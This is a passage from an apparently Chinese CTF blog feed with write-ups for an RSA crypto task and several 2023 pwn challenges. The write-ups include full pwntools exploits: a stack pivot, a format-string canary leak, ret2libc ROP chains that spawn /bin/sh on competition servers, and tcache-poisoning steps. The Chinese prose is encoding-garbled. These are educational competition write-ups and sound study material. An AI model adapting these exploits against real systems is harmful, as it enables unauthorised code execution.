<p><img src="https://i.imgs.ovh/2023/11/19/H0KdW.png" /></p>
<p>åˆ†è§£å‡º pq æ¥ä»¥åå°±æ˜¯å¸¸è§„ rsa äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">187275367513186345104534865239994699892170904489725413330767115192172530253625393062151741036312498277557971553595091826062438445856091864605758318579599363539202154625683947568962358702545878760994434813222953503460910447662183200334960821110618746899798165363389255347363192576250804362413854445821046755759458439443253294822553986237695607000569717855942461517564526611106601774100617668231506539201297550376834067118784548951699927659889815770492684106287801610261026674778509245649501695344652216367741171392139049785280654043804502329999760613658697298671602787929199239524617160567336634126185042907593427921016129734757065504417112269027028799047579450965076835882020261162192475637278445255805339324893626400179818784574957669576516363342104273184813708475202313539634027764340858242764934872804570810575764191987921655276520658100755510986290562980055133376750812535713567917823663134974180449002466833109112866681229626239871954125027501071383217816313440079294139254989413050731511516498127225020975071747314764552267845933494600295296885808466296844091612401062566502515356974852161817112538289440970059783116540091633055220150093646069438113246518726017868258339512247175386052684861670431148484455765445960495130308147156436998327553854387741014177421559585683382003377803158283603889312107837885491964835073892174406797445622388505256985237867456926792546588756970045576002345376035346727906264683596628903417932566383221754976804148878057310066885140776352202510584461556988179369177560403923399529842871087532495739921906849249072433614545319458973155343802539527630971239359995893495205324483418191744545506744253222956232506980824457995662900264427265978239540089825733734306363153471606200228841997928021468359645661221933848545854596097640552489404777927679709089475954033350287287833943519423030861868256961619722983499902810335</span></span><br><span class="line">n = <span class="number">330961752887996173328854935965112588884403584531022561119743740650364958220684640754584393850796812833007843940336784599719224428969119533284286424077547165101460469847980799370419655082069179038497637761333327079374599506574723892143817226751806802676013225188467403274658211563655876500997296917421904614128056847977798146855336939306463059440416150493262973269431000762285579221126342017624118238829230679953011897314722801993750454924627074264353692060002758521401544361385231354313981836056855582929670811259113019012970540824951139489146393182532414878214182086999298397377845534568556100933934481180701997394558264969597606662342898026915506749002491326250792107348176681795942799954526068501499100232598658650184565873243525176833451664254917655703178472944744658628534195346977023418550761620254528178516972066618936960223660362493931786389085393392950207048675797593816271435700130995225483316625836104802608163745376633884840588575355936746173068655319645572100149515524131883813773486917122153248495022372690912572541775943614626733948206252900473118240712831444072243770979419529210034883903111038448366933374841531126421441232024514486168742686297481063089161977054825621099768659097509939405315056325336120929492838479309609958696957890570295444494277819063443427972643459784894450787015151715676537385237767990406742547664321563688829289809321534752244260529319454316532580416182438749849923354060125229328043961355894086576238519138868298499249023773237770103057707912709725417033309061308880583988666463892828633292839968866953776989722310954204550783825704710017434214644199415756584929214239679433211393230307782953067246529626136446314941258877439356094775337541321331600788042698664632064112896956898222397445497695982546922871549828242938368486774617350420790711093069910914135319635330786253331223459637232106417577225350441291</span></span><br><span class="line">p = <span class="number">16486456392568284654575447481741337432037045210800881835922614280067095597403710005455885867829534599108105197853120121574779191481125315722964257888873579099800690068397728960335561315717619132097747891006990987234219773215951341290375325467839650020485843410133760476863038747605417567970738312428198804291743647184526806692092507258393049800262129700391618652453916902141512582838357424455278388992820311182042750759628796263458005206211851622898042001270110860445227518098099442496544291487453616861604254291750411887857595093636553437331170435660475454672143330589299824376076547689051724844786337326281769222107417355877587836699896745726567628092282995399905968099655245359825181671342180522153867520458557378100805495885728965517124749113185924078688116625743891547407248459361185534137655598794841381345072595952173547088910141316887889085791098603541066183857855045537851225348728432140633429582547355875169018387146998010651697236311238281309072462571334886501953441278420091394620498419461947569630534013992500053942893075863031452593127978173868322268503740398804653340332478754797272662812261231775395620689300949393859423566492311584685742006804194387349833713097736389655660701086473349762351032974011890884285149086019</span> </span><br><span class="line">q = <span class="number">20074765917385746960935546244046943454462816043103272528361092579826674512173765241930755746125701611787832050933381141287876969868161022364171839735197812750520430729316788310479069323911390204105953536522038545353910488349500120367222425966798487691717708110938190921291433703777234979917798631930961003842873264252345740246004565354378673284300771278077629291983142857452945395644496169376540506242324806217396415838590757988653416655884020806407076836843763182293453375883193557418497971808909707169877529993060558008071543221829096316946680943004116896967543999782332968077171180309491946947119885153993121862489</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q*p = &#x27;</span>,q*p,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> n == p*q:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n == p * q&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n != p * q&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(n-p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n-q = &#x27;</span>,n-q,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023é¦™å±±æ¯Pwn &amp; RE-wp</title>
    <url>/2023/10/15/comp%20-%202023%E9%A6%99%E5%B1%B1%E6%9D%AFPwn%20&amp;%20RE-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
é¦™å±±æ¯ï¼Pwn ak + RE å·®å‡ åˆ†é’Ÿå°±å†™å®ŒxxTEAå•¦ğŸ˜­
</blockquote>
<span id="more"></span>
<h1 id="re">RE</h1>
<h3 id="urlä»å“ªå„¿æ¥">urlä»å“ªå„¿æ¥</h3>
<p><img src="/pic/image-1.png" /></p>
<p>æ–­ç‚¹ä¸‹åœ¨è¿™ï¼ŒçŸ¥é“ä»–ä¼šåœ¨bufferæŒ‡å‘çš„åœ°å€ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œè®©ç¨‹åºè·‘å®Œï¼Œèƒ½çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶
<img src="/pic/image-2.png" />
idaæ‰“å¼€ï¼Œå› ä¸ºå®ƒé—®urlæ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹szurl <img
src="/pic/image-3.png" />
ç»“æœè¿™ä¸ªä¸æ˜¯flagï¼Œçœ‹åˆ°urlé—®æˆ‘ä»¬æ˜¯å¦‚ä½•è§£å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å›åˆ°ä¸Šé¢é‚£ä¸€å †æ•°æ®é‡Œé¢ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹v13
<img src="/pic/image-4.png" /> flagå°±åœ¨è¿™ <img
src="/pic/image-5.png" /></p>
<h1 id="pwn">Pwn</h1>
<h3 id="move">Move</h3>
<p>æ ˆè¿ç§»åˆ°bssæ®µçš„skddï¼Œæ³„éœ²putsï¼ŒlibcsearcheræŸ¥åˆ°putsçš„libcæ˜¯2.27ï¼Œglibc-all-in-oneä¸‹ä¸€ä¸ªå‡ºæ¥ï¼Œç„¶åè¿”å›mainå‡½æ•°<br />
åœ¨skddé‡Œå†™system("/bin/sh")ï¼Œæœ¬æ¥æ˜¯æƒ³å†æ ˆè¿ç§»ä¸€éï¼Œç»“æœå‘ç°ç›´æ¥do_systemäº†ï¼Œç¨å¾®ä¿®æ”¹äº†ä¸€ä¸‹å°±getshelläº†
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># expå¤´ ---------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;59.110.125.41&#x27;</span></span><br><span class="line">port = <span class="number">45341</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line">bss_addr = <span class="number">0x4050A0</span></span><br><span class="line">lea_addr = <span class="number">0x4012E0</span></span><br><span class="line">junk = <span class="number">0x30</span></span><br><span class="line">pop_rdi = <span class="number">0x401353</span></span><br><span class="line">start_addr = <span class="number">0x401264</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;number&#x27;</span>,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ˆåŠ«æŒ ---------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;a&#x27;</span>*junk + p64(bss_addr-<span class="number">8</span>) + p64(lea_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line"><span class="comment"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr  = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh    = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="comment"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># sh_addr = 0x402027</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line"><span class="comment"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line"><span class="comment"># io.sendafter(&#x27;number&#x27;,payloadload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span></span><br><span class="line"><span class="comment"># io.send(payloadload)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401350 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401352 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040119d : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401353 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401351 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="pwthon">Pwthon</h3>
<p>Cpython pwn<br />
æ ¸å¿ƒé€»è¾‘åœ¨.soæ–‡ä»¶é‡Œï¼Œç›²æ‰“è¯•åˆ°æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæµ‹è¯•å‡ºæ ˆå¤§å°ï¼Œæ³„éœ²å‡ºå¿…è¦çš„ä¿¡æ¯å°±èƒ½ret2libcäº†<br />
giftæ³„éœ²åŸºåœ°å€å’Œè¿”å›åœ°å€<br />
æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²canary<br />
é€šè¿‡putsæ³„éœ²libc ret2libc <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;39.106.48.123&#x27;</span></span><br><span class="line">port = <span class="number">29572</span></span><br><span class="line"><span class="comment"># file = &#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;gift&#x27;</span>)</span><br><span class="line">gift = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">base = gift- <span class="number">0x68B0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift&#x27;</span>,gift)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%p-&#x27;</span>*<span class="number">31</span>+<span class="string">b&#x27;q%pq&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;q&#x27;</span>,drop=<span class="string">&#x27;Ture&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000003f8f</span> + base</span><br><span class="line">pop_rsi = <span class="number">0x0000000000003cd9</span> + base</span><br><span class="line">bss = <span class="number">0x016FC0</span>+<span class="number">0x100</span>+base</span><br><span class="line">read = <span class="number">0x3940</span>+base</span><br><span class="line">write = <span class="number">0x03760</span>+base</span><br><span class="line">op = <span class="number">0x3AE0</span>+base</span><br><span class="line">flag = <span class="number">0x000000000003c257</span>+base</span><br><span class="line">puts = <span class="number">0x3710</span>+base</span><br><span class="line">ret = <span class="number">0x000000000000301a</span>+base</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">33</span>+p64(canary)*<span class="number">2</span>+p64(pop_rdi)+p64(<span class="number">0x16078</span>+base)+p64(puts)+p64(base+<span class="number">0x99f0</span>)</span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;</span></span><br><span class="line">io.send(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len &quot;</span>,<span class="built_in">len</span>(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">32</span>+p64(canary)*<span class="number">3</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="http://localhost:4000/pic/imagexsb.png" /></p>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>WriteUp</tag>
        <tag>Reverse</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023ç¬¬ä¸ƒå±Šè“å¸½æ¯åˆèµ›Pwn-takeway-wp</title>
    <url>/2023/08/26/comp%20-%202023%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BPwn-takeway-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
å­¦è‰ºä¸ç²¾...å¯¹äº"è¯»/å†™å‡½æ•°å¯¹æŒ‡é’ˆçš„åˆ©ç”¨"æ²¡é‚£ä¹ˆæ•æ„Ÿï¼ˆ
</blockquote>
<span id="more"></span>
<h1 id="xff-è¯´åœ¨å‰é¢">0xff è¯´åœ¨å‰é¢</h1>
<p>ä¸‹æ–‡EXPä¸­ï¼Œleakå †åœ°å€çš„éƒ¨åˆ†éœ€è¦"ä¼ªçˆ†ç ´"ï¼Œå¦‚æœæŠ¥é”™çš„è¯å¤šè¿è¡Œä¸¤ä¸‰æ¬¡è„šæœ¬ï¼Œç›´åˆ°heap_addrä¸ºå››å­—èŠ‚æ—¶å³å¯æˆåŠŸè¿è¡Œ
<a href="https://cowtransfer.com/s/bf2ac55a69364d">é¢˜ç›®åœ°å€</a>ä¸‹è½½å£ä»¤:
7c9pe6</p>
<h1 id="x00-exploitations">0x00 Exploitations</h1>
<ol type="1">
<li>tcachebin libc2.31
<ol type="1">
<li>tcachebin poisoning</li>
<li>ç‰ˆæœ¬åˆ¤æ–­
<ol type="1">
<li>tcacheæœ‰keyæ··æ·†ï¼Œåˆ™æ˜¯2.31ä»¥ä¸Š(ä¸åŒ…å«2.31)</li>
<li>tcacheæœ‰doublefreeæ£€æµ‹ï¼Œåˆ™æ˜¯2.28ä»¥ä¸Š</li>
<li>æœ‰tcacheï¼Œåˆ™æ˜¯2.26åŠä»¥ä¸Š</li>
</ol></li>
</ol></li>
<li>UAF</li>
<li>åˆ©ç”¨é¢˜ç›®æä¾›çš„å †è¡¨+puts/readè¿›è¡Œä»»æ„åœ°å€è¯»å†™</li>
</ol>
<h1 id="x01-åæ±‡ç¼–ä¿®æ”¹">0x01 åæ±‡ç¼–ä¿®æ”¹</h1>
<pre><code>    é¦–å…ˆè¿›è¡Œä¸€ä¸ªåæ±‡ç¼–çš„è¯»   </code></pre>
<blockquote>
<p>trick: IDAä¸­å¯¹å˜é‡æŒ‰Yé”®å¯ä»¥æ”¹å˜å˜é‡ç±»å‹</p>
</blockquote>
<p><img src="/pic/Pasted%20image%2020230826230935.png" /> alloc:
strcspnæ˜¯ä»å­—ç¬¦ä¸²ä¸­è¿”å›ä¸å«â€œæ‰€æŸ¥æ‰¾å­—ç¬¦â€çš„å­å­—ç¬¦ä¸²çš„é•¿åº¦ <img
src="/pic/Pasted%20image%2020230826231015.png" /> delete:
æŒ‡é’ˆæœªç½®é›¶ï¼Œä¸€çœ¼UAF <img
src="/pic/Pasted%20image%2020230826231112.png" /> modify <img
src="/pic/Pasted%20image%2020230826231127.png" /></p>
<h1 id="x02-åˆ†æä¸æ€è·¯æ„é€ ">0x02 åˆ†æä¸æ€è·¯æ„é€ </h1>
<blockquote>
<p>åˆ†æéƒ¨åˆ†</p>
</blockquote>
<ol type="1">
<li>åˆ†æalloc: åªç»™äº†äº”æ¬¡åˆ›å»ºå †çš„æœºä¼šï¼Œå †çš„å¤§å°éƒ½å›ºå®šä¸º0x28
<ol type="1">
<li>æ²¡åŠæ³•ç›´æ¥ç”¨unsortedbin leak libc</li>
<li>ä¸èƒ½é€šè¿‡å¡«æ»¡tcachebinæ¥ç»•è¿‡tcacheæœºåˆ¶</li>
<li>tcachebins poisoning
<ol type="1">
<li>èƒ½æ‹¿åˆ°å †åœ°å€: é€šè¿‡gdbæ‰¾åç§»æ¥åœ¨å †åŒºä¼ªé€ chunk</li>
<li>èƒ½æ‹¿åˆ°æ ˆåœ°å€: é€šè¿‡gdbæ‰¾åç§»æ¥åœ¨æ ˆåŒºä¼ªé€ chunk</li>
</ol></li>
</ol></li>
<li>åˆ†æmodify: æœ‰puts/read
<ol type="1">
<li>å¯èƒ½é€šè¿‡puts"ç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦æ‰åœæ­¢è¾“å‡º"çš„åŸç†æ¥æ³„éœ²ä»€ä¹ˆä¸œè¥¿</li>
</ol></li>
<li>åˆ†ædelete
<ol type="1">
<li>UAF</li>
</ol></li>
<li>è¿œç¨‹æµ‹è¯•libcç‰ˆæœ¬
<ol type="1">
<li>doubleFreeæœ‰é™åˆ¶ï¼Œ2.28ä»¥ä¸Š</li>
<li>æ²¡æœ‰keyæ··æ·†bkï¼Œå¯ä»¥ç›´æ¥æ‹¿åˆ°å †åœ°å€ï¼Œ2.31åŠä»¥ä¸‹</li>
</ol></li>
</ol>
<blockquote>
<p>æ€è·¯æ„é€ éƒ¨åˆ†</p>
</blockquote>
<p>æœ€å¼€å§‹æ²¡patchelfï¼Œåªèƒ½freeä¸¤ä¸ªchunkåˆ°tcachebiné‡Œï¼Œé€šè¿‡æ³„éœ²fdçš„æ–¹å¼æ¥æ³„éœ²å †åœ°å€ï¼Œç„¶åæˆ‘æƒ³tcachebin
poisoningæŠŠå †ä¸­å¤§å°ä¸º0x1011çš„ç¼“å†²åŒºä¸‹é¢çš„é‚£ä¸€éƒ¨åˆ†ç»™ä¿®æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆunsortedbinç„¶åè·å–libcï¼Œå†poisonåˆ°gotè¡¨ä¿®æ”¹freeï¼Œæœ€åææƒã€‚ä½†è¿™æ ·æ¶ˆè€—çš„chunkæ•°ç›®è¿œå¤§äº5ä¸ªã€‚</p>
<p>åæ¥patchä»¥åå‘ç°bké‡Œå°±æœ‰å †åœ°å€ï¼Œç„¶ååˆæƒ³åˆ°ä¸´è¿‘top chunkçš„unsorted
binä¼šè¢«åˆå¹¶ã€‚äºæ˜¯æŠŠç›®æ ‡å¯¹å‡†äº†heapListã€‚æƒ³é€šè¿‡ä¿®æ”¹heapListçš„sizeæ®µä½0x1041æ¥ä¼ªé€ ä¸€ä¸ªunsortedbinï¼Œç„¶åleak
libcã€‚ç»“æœä¹Ÿæ˜¯éœ€è¦å¤§é‡chunkï¼Œè€Œä¸”è¿˜ç”³è¯·å¤±è´¥äº†ï¼Œç°åœ¨æ²¡ææ˜ç™½ä¸ºå•¥å¤±è´¥äº†ä¸è¯´ï¼Œè¿æŠ¥é”™éƒ½å¿˜äº†ï¼Œæ— ä»ä¸‹æ‰‹äº†ï¼ˆ</p>
<p>æ‰“å®Œæ¯”èµ›ä»¥åè·ŸN1nEmAnå¸ˆå‚…æ²Ÿæµäº†ä¸€ä¸‹ï¼Œå‘ç°é¢˜ç›®å¦‚æœèƒ½åœ¨heapListä¼ªé€ chunkçš„è¯ï¼Œå°±å¯ä»¥é€šè¿‡modifyå‡½æ•°é‡Œçš„putså’Œreadä»»æ„åœ°å€è¯»å†™äº†ã€‚æˆ‘ç›´æ¥éœ‡æ’¼HeyGapä¸€ç™¾å¹´ã€‚</p>
<p>ç»¼ä¸Šï¼Œæ€è·¯ä¸ºï¼š<br />
1. åˆ©ç”¨tcachebinçš„bkæ³„éœ²å †åœ°å€ 2.
åœ¨heapListä¼ªé€ chunkï¼Œä¿®æ”¹chunk0_pträ¸º"puts_got-8" 3.
putsä¼šæ‰“å°puts_gotæŒ‡å‘çš„åœ°å€ï¼Œå³puts_libc_addrï¼Œç„¶åè®¡ç®—systemåœ°å€ 4.
é€šè¿‡gdbå‘ç°"puts_got-8"æ­£å¥½æ˜¯"free_got" 5.
è€Œreadå‡½æ•°æ­£å¥½æ˜¯ä¿®æ”¹"puts_got-8"æŒ‡å‘çš„åœ°å€ï¼Œå³free_libc_addrï¼Œæˆ‘ä»¬å°†å…¶ä¿®æ”¹ä¸ºsys_libc_addr
6. ç”±äºchunk0_ptr,
chunk1_ptrå‡è¢«ä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾"ptræ²¡æœ‰è¢«ä¿®æ”¹"&amp;"chunkæ²¡æœ‰è¢«freeè¿‡"çš„chunk2å­˜ä¸€ä¸‹/bin/sh
7. free chunk2 --&gt; getshellï¼ # 0x03 åˆ†æ­¥è§£é¢˜ 1.
patchelfï¼Œæ ¹æ®è¿œç¨‹è°ƒè¯•é€‰æ‹©äº†libc2.31 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;$ORIGIN/&#x27; file_name</span><br><span class="line">patchelf --set-interpreter my-ld-linux.so.2 my-program</span><br><span class="line">patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program</span><br></pre></td></tr></table></figure></p>
<ol start="2" type="1">
<li>åˆ©ç”¨tcachebinçš„bkæ³„éœ²å †åœ°å€ å¯ä»¥çœ‹åˆ°bkæ˜¯æŒ‡å‘tcachebin_entries[3]çš„
<img src="/pic/Pasted%20image%2020230827001916.png" />
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = payload2 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">alloc(<span class="number">0</span>,payload1,payload2)</span><br><span class="line">alloc(<span class="number">1</span>,payload1,payload2)     <span class="comment"># è¿™é‡Œç”³è¯·äº†chunk1å…¶å®å¯¹è¿™ä¸€æ­¥æ²¡å•¥ç”¨ï¼Œä¸‹ä¸€æ­¥ç”³è¯·ä¹Ÿè¡Œ</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">5</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># æ³¨ï¼šè¿™é‡Œæˆ‘æ²¡æƒ³åˆ°æ›´å¥½çš„æ–¹æ³•ï¼Œheap_addræœ‰å¯èƒ½æ˜¯ä¸‰å­—èŠ‚</span></span><br><span class="line">															  ä¹Ÿæœ‰å¯èƒ½æ˜¯å››å­—èŠ‚ï¼Œæ‰€ä»¥åç»­å¦‚æœæŠ¥é”™å¤šè¯•å‡ æ¬¡å°±è¡Œã€‚</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr Â  